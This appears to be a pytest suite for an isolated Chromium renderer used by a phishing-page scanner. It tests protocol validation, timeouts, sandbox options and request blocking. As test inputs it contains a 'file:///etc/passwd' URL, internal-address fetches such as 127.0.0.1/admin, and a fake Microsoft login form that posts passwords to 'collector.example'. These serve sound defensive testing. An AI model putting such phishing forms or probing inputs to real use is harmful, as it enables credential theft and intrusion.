"""Offline protocol/lifetime regressions; real Chromium isolation is a Docker check."""

from __future__ import annotations

import hashlib
import socket
import struct
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest
from app.services import browser_renderer, html_scraper_scanner
from app.services import offline_renderer_protocol as protocol
from app.services import offline_renderer_runtime as runtime
from app.services import offline_renderer_service as service
from app.services.offline_renderer_protocol import (
    MAX_HTML_BYTES,
    MAX_WIRE_BYTES,
    SOCKET_PATH,
    VERSION,
    ProtocolError,
    decode_message,
    encode_message,
    read_frame,
    source_hash,
    unavailable,
    validate_request,
    validate_response,
)
from test_detection_policy import MemoryResponse, ProbabilityModel, analyze


def request() -> dict[str, Any]:
    return {
        "version": VERSION,
        "job_id": "a" * 32,
        "url": "https://offline.example/",
        "html": "<html><title>Example</title><body>Original</body></html>",
        "timeout_ms": 250,
    }


def response(job: dict[str, Any]) -> dict[str, Any]:
    return {
        "version": VERSION,
        "job_id": job["job_id"],
        "source_sha256": source_hash(job),
        "status": "rendered",
        "url": job["url"],
        "html": "<html><title>Rendered</title><body>Actual DOM</body></html>",
        "title": "Rendered",
        "visible_text": "Actual DOM",
        "blocked_requests": 1,
        "frame_count": 0,
        "coverage_complete": False,
    }


@pytest.mark.parametrize(
    "change",
    [
        {"version": "other"}, {"job_id": "x" * 32}, {"extra": True},
        {"url": "file:///etc/passwd"}, {"url": "https://user:secret@example.com/"},
        {"url": "https://example.com:0/"}, {"timeout_ms": True},
        {"timeout_ms": 100000}, {"html": "x" * (MAX_HTML_BYTES + 1)},
    ],
)
def test_invalid_jobs_are_rejected_before_browser_launch(change):
    with pytest.raises(ProtocolError):
        validate_request({**request(), **change})


@pytest.mark.parametrize(
    "change",
    [
        {"job_id": "b" * 32}, {"source_sha256": "0" * 64},
        {"url": "https://other.example/"}, {"coverage_complete": True},
        {"html": "x" * (MAX_HTML_BYTES + 1)}, {"blocked_requests": True},
        {"frame_count": -1}, {"secret": "must-not-pass"},
    ],
)
def test_renderer_cannot_change_identity_or_claim_complete_coverage(change):
    with pytest.raises(ProtocolError):
        validate_response({**response(request()), **change}, request())


def test_message_parser_rejects_duplicates_and_excess_bytes():
    with pytest.raises(ProtocolError):
        decode_message(b'{"html":"first","html":"second"}')
    with pytest.raises(ProtocolError):
        decode_message(b" " * (MAX_WIRE_BYTES + 1))


def test_frame_size_is_checked_before_reading_any_body():
    channel = SimpleNamespace(
        settimeout=lambda value: None,
        recv=lambda size: struct.pack("!I", MAX_WIRE_BYTES + 1),
    )
    with pytest.raises(ProtocolError):
        read_frame(channel, 0.1)


def test_partial_message_uses_total_deadline_instead_of_resetting_per_read(monkeypatch):
    times = iter([0, 0.01, 0.02, 0.2])
    pieces = iter([struct.pack("!I", 100), b"{"])
    monkeypatch.setattr(protocol, "monotonic", lambda: next(times))
    channel = SimpleNamespace(settimeout=lambda value: None, recv=lambda size: next(pieces))
    with pytest.raises(TimeoutError):
        read_frame(channel, 0.1)


def test_no_configuration_never_opens_any_socket(monkeypatch):
    def forbidden(*args, **kwargs):
        raise AssertionError("Socket must not be opened")

    monkeypatch.setattr(browser_renderer.socket, "socket", forbidden)
    assert not browser_renderer.render_page("https://offline.example/").available
    assert not browser_renderer.render_page("https://offline.example/", raw_html="x", socket_path="/other.sock").available


@pytest.mark.parametrize("tamper", [False, True])
def test_client_uses_only_unix_socket_and_checks_job_source_identity(monkeypatch, tamper):
    addresses: list[str] = []
    monkeypatch.setattr(socket, "AF_UNIX", getattr(socket, "AF_UNIX", -100), raising=False)

    class Connection:
        incoming = b""

        def __enter__(self):
            return self

        def __exit__(self, *args):
            pass

        def connect(self, path):
            addresses.append(path)

        def settimeout(self, timeout):
            pass

        def sendall(self, payload):
            job = decode_message(payload[4:])
            assert struct.unpack("!I", payload[:4])[0] == len(payload) - 4
            validate_request(job)
            answer = response(job)
            if tamper:
                answer["source_sha256"] = "0" * 64
            raw = encode_message(answer)
            self.incoming = struct.pack("!I", len(raw)) + raw

        def recv(self, size):
            result, self.incoming = self.incoming[:size], self.incoming[size:]
            return result

    def connect(family, kind):
        assert family == socket.AF_UNIX
        assert kind == socket.SOCK_STREAM
        return Connection()

    monkeypatch.setattr(browser_renderer.socket, "socket", connect)
    result = browser_renderer.render_page(
        request()["url"], timeout_ms=250, raw_html=request()["html"], socket_path=SOCKET_PATH
    )
    assert addresses == [SOCKET_PATH]
    assert result.available is (not tamper)
    assert result.coverage_complete is False
    if not tamper:
        assert result.blocked_requests == 1


def test_parent_deadline_kills_and_reaps_actual_child(monkeypatch):
    real_popen = subprocess.Popen
    children: list[subprocess.Popen] = []

    def process(*args, **kwargs):
        assert kwargs["start_new_session"] is True
        assert "ALLSAFE_INTEGRATION_KEY" not in kwargs["env"]
        kwargs["cwd"] = Path.cwd()
        child = real_popen([sys.executable, "-I", "-c", "import time; time.sleep(60)"], **kwargs)
        children.append(child)
        return child

    monkeypatch.setenv("ALLSAFE_INTEGRATION_KEY", "not-for-browser")
    monkeypatch.setattr(service.subprocess, "Popen", process)
    if sys.platform != "linux":
        monkeypatch.setattr(service, "_kill_group", lambda child: child.kill())
    result = service.bounded_render(request())
    assert result["error"] == "render_deadline"
    assert len(children) == 1
    assert children[0].poll() is not None


def test_runtime_refuses_a_networked_or_root_environment(monkeypatch):
    monkeypatch.setattr(runtime, "isolated_runtime", lambda: False)
    result = runtime.render_document(request())
    assert result == unavailable(request(), "render_failed")


def test_runtime_fulfills_only_original_get_and_forces_sandbox(monkeypatch):
    routes: list[Any] = []
    options: dict[str, Any] = {}
    websocket_handlers: list[Any] = []
    main_frame = object()

    class Route:
        def __init__(self, method, url, frame=main_frame):
            self.request = SimpleNamespace(method=method, url=url, frame=frame, is_navigation_request=lambda: True)
            self.fulfilled = False
            self.aborted = False

        def fulfill(self, **kwargs):
            assert kwargs["body"] == request()["html"]
            self.fulfilled = True

        def abort(self, reason):
            self.aborted = True

    class Page:
        url = request()["url"]

        def __init__(self):
            self.main_frame = main_frame
            self.frames = [main_frame]

        def on(self, *args):
            pass

        def goto(self, url, **kwargs):
            for route in [
                Route("GET", url),
                Route("GET", "http://127.0.0.1/admin"),
                Route("GET", "http://100.64.0.1/"),
                Route("POST", url),
                Route("GET", "https://other.example/frame", object()),
                Route("GET", url),  # even a second original-page fetch is blocked
            ]:
                handler(route)
                routes.append(route)

        def wait_for_timeout(self, value):
            pass

        def content(self):
            return response(request())["html"]

        def title(self):
            return "Rendered"

        def locator(self, selector):
            return SimpleNamespace(inner_text=lambda timeout: "Actual DOM")

    class Context:
        def set_default_timeout(self, value):
            pass

        def route_web_socket(self, pattern, callback):
            websocket_handlers.append(callback)

        def new_page(self):
            return Page()

        def route(self, pattern, callback):
            nonlocal handler
            handler = callback

        def on(self, *args):
            pass

    class Browser:
        def new_context(self, **kwargs):
            options["context"] = kwargs
            return Context()

        def close(self):
            pass

    class Playwright:
        chromium = SimpleNamespace()

        def __enter__(self):
            self.chromium = self
            return self

        def __exit__(self, *args):
            pass

        def launch(self, **kwargs):
            options["launch"] = kwargs
            return Browser()

    handler = None
    monkeypatch.setattr(runtime, "isolated_runtime", lambda: True)
    monkeypatch.setitem(sys.modules, "playwright.sync_api", SimpleNamespace(sync_playwright=Playwright))
    result = runtime.render_document(request())
    assert result["status"] == "rendered"
    assert options["launch"]["chromium_sandbox"] is True
    assert options["context"]["service_workers"] == "block"
    assert options["context"]["accept_downloads"] is False
    assert routes[0].fulfilled and not routes[0].aborted
    assert all(route.aborted and not route.fulfilled for route in routes[1:])
    assert result["blocked_requests"] == 5
    websocket = SimpleNamespace(close=lambda: options.update(websocket_closed=True))
    websocket_handlers[0](websocket)
    assert options["websocket_closed"]
    assert result["coverage_complete"] is False


def test_rendered_inline_form_adds_evidence_without_claiming_complete(monkeypatch):
    original = "<html><div id='root'></div><script>document.write('form')</script></html>"
    rendered = """<html><title>Microsoft Login</title><form action='https://collector.example/'>
    <input type='password'></form></html>"""
    scanner = html_scraper_scanner.HtmlScraperScanner(browser_render_enabled=True, browser_socket_path=SOCKET_PATH)
    scanner.model = ProbabilityModel(0.01)
    monkeypatch.setattr(scanner, "_safe_get", lambda url, headers: (MemoryResponse(original), url, []))

    def render(url, **kwargs):
        assert kwargs["raw_html"] == original
        assert kwargs["socket_path"] == SOCKET_PATH
        return browser_renderer.BrowserRenderResult(available=True, html=rendered, final_url=url, visible_text="Login")

    monkeypatch.setattr(html_scraper_scanner, "render_page", render)
    stage = scanner.scan("https://offline.example/")
    assert stage.verdict == "malicious"
    assert stage.details["dynamic_analysis"]["required"] is True
    assert stage.details["dynamic_analysis"]["available"] is False
    assert stage.training_features["html_hash"] == hashlib.sha256(rendered.encode()).hexdigest()


def test_rendering_cannot_delete_original_strong_static_evidence(monkeypatch):
    original = """<html><title>Microsoft Login</title><form action='https://collector.example/'>
    <input type='password'></form><script>document.body.remove()</script></html>"""
    monkeypatch.setattr(
        html_scraper_scanner.HtmlScraperScanner, "_maybe_render_html",
        lambda *args: browser_renderer.BrowserRenderResult(available=True, html="<html><p>Nothing here</p></html>", visible_text="Nothing here"),
    )
    result, stage = analyze(monkeypatch, original)
    assert stage.details["rule_context"]["strong_signal"]
    assert stage.details["rule_context"]["original_static_evidence_retained"]
    assert result.final_verdict == "malicious"


def test_selected_original_model_features_retain_original_hash(monkeypatch):
    original = "<html><p>Original source</p></html>"
    rendered = "<html><p>Rendered source</p></html>"
    monkeypatch.setattr(
        html_scraper_scanner.HtmlScraperScanner, "_maybe_render_html",
        lambda *args: browser_renderer.BrowserRenderResult(available=True, html=rendered, visible_text="Rendered source"),
    )

    def predict(self, url, html):
        probability = 0.99 if html == original else 0.01
        return {"available": True, "model_risk_score": 0.85 if probability > 0.5 else 0, "malicious_probability": probability,
                "clean_probability": 1 - probability, "features": {"source": 1 if html == original else 2}}

    monkeypatch.setattr(html_scraper_scanner.HtmlScraperScanner, "_predict_html_model", predict)
    _, stage = analyze(monkeypatch, original)
    assert stage.verdict == "malicious"
    assert stage.training_features["html_features"] == {"source": 1}
    assert stage.training_features["html_hash"] == hashlib.sha256(original.encode()).hexdigest()
    assert stage.training_features["html_hash_scheme"] == "html-analyzed-utf8-sha256-v1"
